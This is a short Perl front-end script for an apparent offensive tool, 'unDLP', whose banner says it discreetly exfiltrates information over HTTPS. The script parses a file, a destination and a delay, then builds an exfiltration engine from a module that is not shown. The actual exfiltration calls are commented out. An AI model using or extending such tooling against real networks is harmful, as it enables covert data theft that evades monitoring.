#!/usr/bin/perl

use strict;
use warnings;

require Entity::Parser;
require Module::HTTPSExfiltration;

print "
             ________  .____   __________
 __ __  ____ \\______ \\ |    |  \\______   \\
|  |  \\/    \\ |    |  \\|    |   |     ___/
|  |  /   |  \\|    `   \\    |___|    |
|____/|___|  /_______  /_______ \\____|
           \\/        \\/        \\/

Discreetly exfiltrate information via the HTTPS protocol.

Fell free to contact the maintainer for any further questions or improvement vectors.
Maintained by Nitrax <nitrax\@lokisec.fr>

";

my $parser = Parser->new();

$parser->parse(@ARGV);

my $engine = HTTPSExfiltration->new(file => $parser->file, dest => $parser->dest, delay => $parser->delay);

print $engine->delay()
# $engine->init();
# $engine->exfiltrate();
